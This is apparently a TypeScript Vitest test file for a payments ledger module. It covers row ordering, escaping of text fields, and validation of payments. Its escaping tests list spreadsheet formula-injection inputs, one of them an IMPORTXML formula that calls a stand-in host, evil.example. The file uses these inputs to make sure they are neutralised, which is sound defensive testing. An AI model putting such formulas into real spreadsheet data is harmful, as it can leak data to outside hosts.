import { describe, expect, it } from 'vitest'
import type { PaymentType } from '@/types/payment'
import { getPaymentRow, isValidPayment, MAX_DESCRIPTION_LENGTH } from './payments'

const payment: PaymentType = {
  date: '2026-05-02T01:00:00.000Z',
  paymentMethod: 'Efectivo',
  description: 'Seña',
  service: 'Maquillaje',
  amount: 1000,
  clientId: ''
}

describe('getPaymentRow', () => {
  it('keeps the column order of the ledger, whatever the key order', () => {
    const { amount, service, ...rest } = payment
    expect(getPaymentRow({ amount, service, ...rest })).toEqual(['1/5/2026', 'Efectivo', 'Seña', 'Maquillaje', 1000, ''])
  })

  it('fills in a missing client', () => {
    const row = getPaymentRow({ ...payment, clientId: undefined })
    expect(row).toHaveLength(6)
    expect(row[5]).toBe('')
  })

  it('ignores unknown fields, which would add columns', () => {
    expect(getPaymentRow({ ...payment, extra: 'x' } as PaymentType)).toHaveLength(6)
  })
})

describe('getPaymentRow text fields', () => {
  it.each([
    '=IMPORTXML("https://evil.example","//a")',
    '  =1+1',
    '+1',
    '-1',
    '@SUM(A1)'
  ])('keeps %s from running as a formula', (description) => {
    const row = getPaymentRow({ ...payment, description, clientId: description })
    expect(row[2]).toBe(`'${description}`)
    expect(row[5]).toBe(`'${description}`)
  })

  it('leaves normal text alone', () => {
    expect(getPaymentRow({ ...payment, description: 'Seña - novia' })[2]).toBe('Seña - novia')
  })
})

describe('isValidPayment', () => {
  it('accepts a valid payment', () => {
    expect(isValidPayment(payment)).toBe(true)
  })

  it.each([
    ['null', null],
    ['a string', 'x'],
    ['invalid date', { ...payment, date: 'nope' }],
    ['unknown method', { ...payment, paymentMethod: 'Bitcoin' }],
    ['unknown service', { ...payment, service: 'Otro' }],
    ['zero amount', { ...payment, amount: 0 }],
    ['missing description', { ...payment, description: undefined }],
    ['long description', { ...payment, description: 'a'.repeat(MAX_DESCRIPTION_LENGTH + 1) }],
    ['non-string client', { ...payment, clientId: 1 }]
  ])('rejects %s', (_name, data) => {
    expect(isValidPayment(data)).toBe(false)
  })
})
